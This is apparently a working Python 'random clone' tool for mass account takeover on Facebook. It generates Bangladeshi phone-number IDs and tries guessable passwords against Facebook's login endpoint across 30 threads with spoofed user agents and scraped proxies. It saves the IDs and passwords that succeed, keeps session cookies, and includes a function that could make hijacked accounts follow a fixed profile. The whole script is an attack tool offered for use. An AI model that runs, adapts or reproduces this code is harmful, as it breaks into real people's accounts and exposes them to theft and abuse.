#credit mr mivi
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

G='\033[38;5;46m'
R='\033[38;5;196m'
B='\033[1;34m'
Y='\033[1;33m'
P='\033[38;5;203m'
W='\033[1;37m'
X='\033[1;30m'


logo = ("""\033[1;32m 
                   \033[1;32m╭━━━╮╭╮╭━━━┳╮╱╭┳━━━━╮
                   \033[1;33m┃╭━╮┣╯┃┃╭━━┫┃╱┃┃╭╮╭╮
                   \033[1;32m┃╰━╯┣╮┃┃╰━━┫╰━╯┣╯┃┃╰╯
                   \033[1;33m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃
                   \033[1;32m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃
                  \033[1;33m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯                                             
\x1b[38;5;46m_____________________________________________________
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : Md. Rifat Hasan Rear             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Md. Rifat Hasan Rear           
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE  
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL VERSION :1.0 
\x1b[38;5;46m_____________________________________________________""")
os.system("clear")
try:
    key1=open("/storage/emulated/0/AP.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/AP.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="RIFAT-,VAU"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)
    
a=requests.get("https://github.com/R1F4T-2-0/CK-RENDOM/blob/main/Try.txt").text
b=str(a)
key1=open("/storage/emulated/0/AP.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print(logo)
    print()
    print()
    print("\033[1;31m TOOL.IS FREE BUT YOU NEED PERMITION TO USE IT")
    print("\033[1;33m=====================================================")
    print("Your key  : "+key2)
    print("\n\t\tContact Admin ")
    print("\033[1;33m=====================================================")
    
    os.system('xdg-open https://www.facebook.com/R1F4T.OFFICIAL.ACCOUNT')
    exit()
def R1F4Tx():
	print(54*'━')
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
        os.system("clear")
        print(logo)
        print("\033[1;32m \x1b[1;92m\x1b[1;97m[\x1b[1;92mA\x1b[1;97m]\33[1;92m RANDOM CRACK")
        print(" \033[1;32m\x1b[1;92m\x1b[1;97m[\x1b[1;92mB\x1b[1;97m]\33[1;92m Exit")
        print(54*'━')
        Mumit =input("\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m Choose : ")
        if Mumit in ["1","A"]:
            fuck()
        if Mumit in [" 0", "B"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
    print(54*'━')
    code = input(' ┗━[+] SELECT : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m EXAMPLE: 2000 3000 5000 10000 ')
    print(54*'━')
    limit = int(input('\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f' \033[1;32m[{R}⍣{G}]{G} SIM ID   {R}:{G} {code}')
        print(f' [{R}⍣{G}]{G} TOTAL ID {R}:{G} {tl}')
        print(f' \033[1;32m[{R}⍣{G}]{G} MIX IDZ CLONING ')
        print(f' \033[1;31m[{R}⍣{G}]{G} ONLY DATA ENJOY DEAR USER')
        print(54*'━')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(naim2,uid,pwx,tl)
    print(54*'━')
    print(' [+] OK Ids saved in R1F4T/OK.txt')
    print(' [+] CP Ids saved in R1F4T/CP.txt')
    print(54*'━')
    
agents=[]
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100007373957944', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
def naim2(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write('\r [R1F4T]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            m_fb = session.get('https://free.facebook.com/?tbua=1').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(m_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(m_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(m_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(m_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;97m [\33[1;92mR1F4T-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
               # print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                open('R1F4T-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(uid);cek_apk(coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
                open('R1F4T-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
